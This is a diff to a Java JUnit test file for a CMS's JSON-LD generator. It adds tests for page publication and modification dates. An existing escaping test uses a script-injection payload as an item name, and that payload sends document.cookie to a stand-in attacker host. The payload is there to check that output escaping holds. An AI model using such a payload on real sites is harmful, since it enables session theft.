@@ -22,6 +22,7 @@ import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
+import java.sql.Timestamp;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -29,6 +30,7 @@ import org.junit.jupiter.api.Test;
 
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
+import com.simisinc.platform.domain.model.cms.WebPage;
 import com.simisinc.platform.domain.model.items.Item;
 
 /**
@@ -76,7 +78,7 @@ class PageServletTest {
     item.setName("</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
     item.setDescription("Also \"quoted\" and <b>bold</b>");
 
-    String jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, item, null);
+    String jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, item, null, null);
 
     assertFalse(jsonLd.toLowerCase().contains("</script"),
         "a poisoned item name must not be able to close the surrounding <script> tag: " + jsonLd);
@@ -87,6 +89,66 @@ class PageServletTest {
     JsonNode product = parsed.get("@graph").get(2);
     assertEquals("Product", product.get("@type").asText());
     assertTrue(product.get("name").asText().contains("</script><script>"));
+  }
+
+  @Test
+  void generateJsonLdDataIncludesDateModifiedAndDatePublishedFromWebPage() {
+    PageRenderInfo pageRenderInfo = new PageRenderInfo();
+    pageRenderInfo.setPageUrl("https://example.org/about");
+
+    Map<String, String> sitePropertyMap = new HashMap<>();
+    sitePropertyMap.put("site.name", "Example Co");
+
+    WebPage webPage = new WebPage();
+    webPage.setCreated(Timestamp.from(java.time.Instant.parse("2026-01-01T00:00:00Z")));
+    webPage.setPublishAt(Timestamp.from(java.time.Instant.parse("2026-02-01T00:00:00Z")));
+    webPage.setModified(Timestamp.from(java.time.Instant.parse("2026-03-15T12:30:00Z")));
+
+    String jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, null, null, webPage);
+
+    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
+    JsonNode webPageNode = parsed.get("@graph").get(1);
+    assertEquals("WebPage", webPageNode.get("@type").asText());
+    assertEquals("2026-03-15T12:30:00Z", webPageNode.get("dateModified").asText());
+    // datePublished prefers publishAt over created when both are present
+    assertEquals("2026-02-01T00:00:00Z", webPageNode.get("datePublished").asText());
+  }
+
+  @Test
+  void generateJsonLdDataFallsBackToCreatedForDatePublishedWhenPublishAtIsMissing() {
+    PageRenderInfo pageRenderInfo = new PageRenderInfo();
+    pageRenderInfo.setPageUrl("https://example.org/about");
+
+    Map<String, String> sitePropertyMap = new HashMap<>();
+    sitePropertyMap.put("site.name", "Example Co");
+
+    WebPage webPage = new WebPage();
+    webPage.setCreated(Timestamp.from(java.time.Instant.parse("2026-01-01T00:00:00Z")));
+
+    String jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, null, null, webPage);
+
+    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
+    JsonNode webPageNode = parsed.get("@graph").get(1);
+    assertEquals("2026-01-01T00:00:00Z", webPageNode.get("datePublished").asText());
+    assertNull(webPageNode.get("dateModified"));
+  }
+
+  @Test
+  void generateJsonLdDataOmitsDatesWhenWebPageIsNull() {
+    PageRenderInfo pageRenderInfo = new PageRenderInfo();
+    pageRenderInfo.setPageUrl("https://example.org/items/staff/jane-doe");
+
+    Map<String, String> sitePropertyMap = new HashMap<>();
+    sitePropertyMap.put("site.name", "Example Co");
+
+    // Item detail pages have no WebPage at all -- this must not throw or fabricate dates
+    String jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, null, null, null);
+
+    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
+    JsonNode webPageNode = parsed.get("@graph").get(1);
+    assertEquals("WebPage", webPageNode.get("@type").asText());
+    assertNull(webPageNode.get("dateModified"));
+    assertNull(webPageNode.get("datePublished"));
   }
 
   @Test
